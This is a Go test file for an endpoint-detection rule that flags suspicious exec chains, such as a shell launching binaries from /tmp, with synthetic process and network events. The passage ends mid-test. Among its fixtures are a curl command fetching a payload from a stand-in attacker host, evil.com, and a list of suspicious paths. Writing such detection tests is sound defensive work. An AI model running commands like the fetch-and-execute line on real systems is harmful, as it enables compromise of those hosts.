package catalog

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/rules/api"
)

// materialize processes events through the graph builder so processes are
// available for detection rule lookups.
func materialize(t *testing.T, s *catalogStore, events []api.Event) {
	t.Helper()
	_ = s
	require.NoError(t, s.ProcessBatch(t.Context(), events))
}

func TestSuspiciousExecDetectsPayloadFromTmp(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// Simulate: python3 (PID 50) → /bin/sh (PID 100) → /tmp/payload (PID 200)
	events := []api.Event{
		{EventID: "fork-python", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-python", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
	}

	// Insert and materialize events.
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "suspicious_exec", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Suspicious exec chain", f.Title)
	assert.Contains(t, f.Description, "/usr/bin/python3")
	assert.Contains(t, f.Description, "/bin/sh")
	assert.Contains(t, f.Description, "/tmp/payload")
	assert.Contains(t, f.EventIDs, "exec-sh")
}

// Covers the "shell exec optimization" case on macOS: `sh -c "<single command>"` re-execs the target binary directly, reusing the
// shell's pid instead of fork+exec'ing a child. The exec event stream shows two exec events for the same pid (first /bin/sh, then the
// payload), and the processes table ends up with the pid's path as the payload. The rule must still fire.
func TestSuspiciousExecDetectsShellReExec(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// Simulate: python3 (PID 50) forks child 100, which execs /bin/sh then immediately re-execs /private/tmp/payload at the same pid.
	// No separate child process for the payload.
	events := []api.Event{
		{EventID: "fork-python", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-python", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","/private/tmp/payload pwned"],"uid":501,"gid":20}`)},
		// Same pid (100) re-execs into /private/tmp/payload.
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 2200, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/private/tmp/payload","args":["/private/tmp/payload","pwned"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "suspicious_exec", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Suspicious exec chain", f.Title)
	assert.Contains(t, f.Description, "/usr/bin/python3")
	assert.Contains(t, f.Description, "/bin/sh")
	assert.Contains(t, f.Description, "/private/tmp/payload")
	assert.Contains(t, f.EventIDs, "exec-sh")
}

func TestSuspiciousExecSkipsShellToShell(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// bash → sh is normal and should not trigger.
	events := []api.Event{
		{EventID: "fork-bash", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-bash", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/bin/bash","args":["bash"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","echo hi"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings)
}

func TestSuspiciousExecSkipsNonSuspiciousPath(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 → sh → /usr/bin/ls is not suspicious.
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","ls"],"uid":501,"gid":20}`)},
		{EventID: "fork-ls", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-ls", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/ls","args":["ls"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings)
}

func TestSuspiciousExecDetectsVarTmp(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 → zsh → /var/tmp/malware
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-zsh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-zsh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/zsh","args":["zsh"],"uid":501,"gid":20}`)},
		{EventID: "fork-mal", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-mal", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/var/tmp/malware","args":["/var/tmp/malware"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Contains(t, findings[0].Description, "/var/tmp/malware")
}

func TestSuspiciousExecSkipsChildOutsideWindow(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 → sh, but child exec from /tmp/ happens 31 seconds later (outside window).
	shellTime := int64(1_000_000_000)
	childTime := shellTime + 31_000_000_000 // 31 seconds later

	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 500_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 600_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: shellTime, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: shellTime + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-late", HostID: "host-a", TimestampNs: childTime, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-late", HostID: "host-a", TimestampNs: childTime + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings)
}

func TestSuspiciousExecPathTraversal(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 → sh → /usr/local/../../../tmp/evil
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-evil", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-evil", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/local/../../../tmp/evil","args":["/usr/local/../../../tmp/evil"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Contains(t, findings[0].Description, "..")
}

// spec:server-detection-rules-engine/canonical-rule-naming/a-multi-arm-rule-raises-one-canonical-title-across-arms
func TestSuspiciousExecDetectsShellWithOutboundConnection(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 (PID 50) → /bin/sh (PID 100) → curl (PID 200) which makes an outbound connection.
	// curl's path is /usr/bin/curl (not suspicious), but the outbound network connection triggers detection.
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl ..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","https://evil.com/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443,"remote_hostname":"evil.com"}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "suspicious_exec", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Suspicious exec chain", f.Title)
	assert.Contains(t, f.Description, "198.51.100.42:443")
	assert.Contains(t, f.EventIDs, "exec-sh")
	assert.Contains(t, f.EventIDs, "net-curl")
}

func TestSuspiciousExecPrefersSuspiciousPathOverNetwork(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 → sh → /tmp/payload (suspicious path) AND outbound connection.
	// Should fire the path-based alert, not the network one (avoid double-alerting).
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-payload", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/tmp/payload","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443,"remote_hostname":"evil.com"}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1)

	// Should be the path-based finding, not the network one. Both arms now share the canonical title (issue #519), so the
	// discriminator is the Description: the temp arm names the /tmp path, the network arm says "outbound".
	assert.Equal(t, "Suspicious exec chain", findings[0].Title)
	assert.Contains(t, findings[0].Description, "/tmp/payload")
	assert.NotContains(t, findings[0].Description, "outbound")
}

func TestIsSuspiciousPath(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name       string
		path       string
		suspicious bool
	}{
		{"tmp", "/tmp/payload", true},
		{"var tmp", "/var/tmp/malware", true},
		{"private tmp", "/private/tmp/x", true},
		{"dev shm", "/dev/shm/backdoor", true},
		{"path traversal", "/usr/../tmp/x", true},
		{"usr bin", "/usr/bin/ls", false},
		{"usr local", "/usr/local/bin/brew", false},
		{"applications", "/Applications/Safari.app/Contents/MacOS/Safari", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.suspicious, isSuspiciousPath(tc.path))
		})
	}
}

// Shebang stage-2: the kernel resolves `#!/bin/sh` to /bin/sh, so the temp-binary's exec event lands with payload.path = /bin/sh and
// the actual script path in argv[1]. The runbook's `python3 -> sh -c "/tmp/edr-attack-runbook/synthetic_payload && true"` chain on
// edr-qa surfaces this shape because bash interprets the synthetic_payload shebang line, and without argv-aware temp-path detection
// the rule silently misses the attack. This test pins the shebang detection AND its negative twin (`sh -c <command>` argv[1] = "-c",
// not a path).
func TestSuspiciousExecDetectsShebangScriptInArgs(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// python3 (50) -> /bin/sh as shebang interpreter for /tmp/payload.sh (200). payload.path = /bin/sh, argv[1] = /tmp/payload.sh: the
	// kernel-resolved shebang shape.
	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-shebang", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-shebang", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/bin/sh","args":["/bin/sh","/tmp/payload.sh"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1, "shebang script in argv[1] must match the temp-exec arm")
	assert.Equal(t, "Suspicious exec chain", findings[0].Title)
	assert.Contains(t, findings[0].Description, "/usr/bin/python3")
	assert.Contains(t, findings[0].Description, "/tmp/payload.sh", "description must surface the argv script path, not just /bin/sh")
}

// Negative twin of the shebang case: `sh -c <command>` puts the COMMAND STRING in argv[2], not a script path. Treating that argv slot
// as a path would false-positive on any command containing `..` (e.g. an IPv4 octet sequence in a curl URL). The shebang detector must
// bail the moment it sees `-c`.
func TestSuspiciousExecSkipsShDashCEvenIfArgContainsDots(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	events := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		// argv[2] is the -c command body, which happens to contain ".." that
		// an unguarded path-traversal heuristic would mistake for a path.
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","echo 192.168.1.1..."],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "sh -c <command> argv must NOT be treated as a script path")
}

// Allowlist suppression: the canonical "non-shell -> shell -> /tmp/binary" shape is also what an admin SSH-ing in and running
// a script from /tmp/ looks like. Operators can opt-in to suppression of that flow per known-good entry-point path via
// EDR_SUSPICIOUS_EXEC_PARENT_ALLOWLIST. This test pins the suppression behaviour: when the non-shell ancestor's path is on the
// allowlist, the rule must stay silent. Without the allowlist, the same chain still fires (the second sub-test).
func TestSuspiciousExec_ParentAllowlistSuppresses(t *testing.T) {
	t.Parallel()
	// sshd-session -> /bin/sh -> /tmp/payload: the "admin SSH and run a script from /tmp/" shape, observed live during edr-qa.
	// Built fresh per subtest because Store.InsertEvents mutates events[i].IngestedAtNs in place; sharing one slice across
	// parallel subtests would race the writes.
	makeEvents := func() []api.Event {
		return []api.Event{
			{EventID: "fork-sshd", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
			{EventID: "exec-sshd", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/libexec/sshd-session","args":["sshd-session"],"uid":0,"gid":0}`)},
			{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
			{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
			{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
			{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		}
	}

	t.Run("with sshd-session in allowlist: suppressed", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents()
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "suspicious_exec", matchType: api.ExclusionMatchParentPathGlob, value: "/usr/libexec/sshd-session"},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "excluded parent must suppress the finding")
	})

	t.Run("without allowlist: fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents()
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "with no allowlist the chain still matches")
		assert.Contains(t, findings[0].Description, "/usr/libexec/sshd-session")
	})
}

// TestSuspiciousExec_ParentSignatureExclusion covers signature-based parent exclusions (issue #520): an operator can suppress a benign
// signed parent by its non-spoofable code-signing identity (team_id / signing_id / cdhash) read from the parent's already-persisted
// process record, and an unsigned lookalike at a benign-looking path is NOT suppressed by such an exclusion. This is the concrete win
// that lets team_id=Q6L2SF6YDW replace a spoofable `*/claude/versions/*` path glob for a Developer-ID tool like Claude Code.
//
// spec:server-detection-rules-engine/signature-based-parent-exclusions/a-signed-parent-is-suppressed-by-its-team-id
// spec:server-detection-rules-engine/signature-based-parent-exclusions/an-unsigned-lookalike-parent-is-not-suppressed
func TestSuspiciousExec_ParentSignatureExclusion(t *testing.T) {
	t.Parallel()

	const (
		teamID    = "Q6L2SF6YDW"
		signingID = "com.anthropic.claude-code"
		cdhash    = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	)
	// signed parent -> /bin/sh -> /tmp/payload. parentExtra embeds a code_signing blob + cdhash on the parent exec so the graph
	// persists them on the process record parentExcluded reads; passing "" models an attacker's unsigned /tmp lookalike.
	makeEvents := func(parentPath, parentExtra string) []api.Event {
		return []api.Event{
			{EventID: "fork-parent", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
			{EventID: "exec-parent", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"` + parentPath + `","args":["claude"],"uid":501,"gid":20` + parentExtra + `}`)},
			{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
			{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
			{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
			{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		}
	}
	signedExtra := `,"code_signing":{"team_id":"` + teamID + `","signing_id":"` + signingID +
		`","flags":0,"is_platform_binary":false},"cdhash":"` + cdhash + `"`
	const signedParentPath = "/Applications/Claude.app/Contents/MacOS/claude"

	// Baseline: the signed fixture must be detection-positive with NO exclusion. Without this, a regression that stops the fixture
	// firing for an unrelated reason would let every suppression subtest below pass vacuously (they only assert zero findings).
	t.Run("signed parent fires without an exclusion", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents(signedParentPath, signedExtra)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "signed parent fixture must fire before the suppression cases assert it is suppressed")
	})

	suppressCases := []struct {
		name string
		excl fakeExcl
	}{
		{"team_id suppresses", fakeExcl{ruleID: "suspicious_exec", matchType: api.ExclusionMatchTeamID, value: teamID}},
		{"signing_id suppresses", fakeExcl{ruleID: "suspicious_exec", matchType: api.ExclusionMatchSigningID, value: signingID}},
		{"cdhash suppresses", fakeExcl{ruleID: "suspicious_exec", matchType: api.ExclusionMatchCDHash, value: cdhash}},
	}
	for _, tc := range suppressCases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			s := openCatalogStore(t)
			ctx := t.Context()
			events := makeEvents(signedParentPath, signedExtra)
			require.NoError(t, s.InsertEvents(ctx, events))
			materialize(t, s, events)

			rule := &SuspiciousExec{Exclusions: &fakeExclusions{entries: []fakeExcl{tc.excl}}}
			findings, err := rule.Evaluate(ctx, events, s.GraphReader())
			require.NoError(t, err)
			assert.Empty(t, findings, "signed parent matched by its signing identity must suppress the finding")
		})
	}

	t.Run("unsigned lookalike parent is not suppressed by a team_id exclusion", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// The attacker's lookalike: an unsigned binary at a path that resembles the benign tool. It carries no code_signing, so the
		// team_id exclusion cannot match even though a `*/claude/versions/*` path glob would have.
		events := makeEvents("/tmp/claude/versions/1.0/claude", "")
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "suspicious_exec", matchType: api.ExclusionMatchTeamID, value: teamID},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "an unsigned parent has no team_id, so the signature exclusion must not suppress it")
	})
}

// Cross-batch race: in production the agent flushes events ~once per second while a real chain completes in ~150ms, so when the
// cadence boundary lands mid-chain the shell exec arrives in batch N and the temp-binary exec in batch N+1. Forward-direction matching
// missed the chain entirely under those conditions because at batch N's Evaluate the temp-binary descendant hadn't been materialised.
// Reverse-direction matching is race-immune: by the time the temp-binary exec event lands in batch N+1, the shell ancestor is already
// in the store from batch N's ProcessBatch. This test exercises that path explicitly.
func TestSuspiciousExec_CrossBatchTempExec(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// Batch 1: python3 + /bin/sh, no temp-binary yet, so no firing.
	batch1 := []api.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
